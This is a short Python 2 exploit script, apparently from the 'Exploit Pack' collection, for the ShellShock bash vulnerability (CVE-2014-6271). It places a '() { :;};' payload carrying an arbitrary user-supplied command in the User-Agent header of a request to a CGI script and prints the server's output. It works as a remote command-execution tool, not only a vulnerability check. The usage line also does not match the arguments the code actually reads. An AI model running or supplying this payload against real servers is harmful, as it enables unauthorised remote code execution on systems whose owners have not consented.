# Modified by JSacco - jsacco@exploitpack.com
# Exploit Pack 2014
# How to run: checkCVE20146271.py http://www.server.com/script.cgi

import urllib2, sys

Target = sys.argv[1]
Port = int(sys.argv[2])
ShellcodeType = sys.argv[3]
Extra = sys.argv[4]

print "Check a host: checkbash.py http://www.domain.com/script.cgi"
print "Info: GNU Bash through 4.3 processes trailing strings after function definitions in the values of environment variables, which allows remote attackers to execute arbitrary code via a crafted environment, as demonstrated by vectors involving the ForceCommand feature in OpenSSH sshd, the mod_cgi and mod_cgid modules in the Apache HTTP Server, scripts executed by unspecified DHCP clients, and other situations in which setting the environment occurs across a privilege boundary from Bash execution, aka ShellShock."
print "###########################################################"
header = {'User-Agent': '() { :;}; echo Content-type:text/plain;echo;%s'%(Extra)}

request = urllib2.Request(Target, '', header)
if urllib2.urlopen(request).read().find("www-data") != -1 or urllib2.urlopen(request).read().find("http") != -1:
    print "Response from server:", urllib2.urlopen(request).read()
    print "Seems vulnerable:", Target
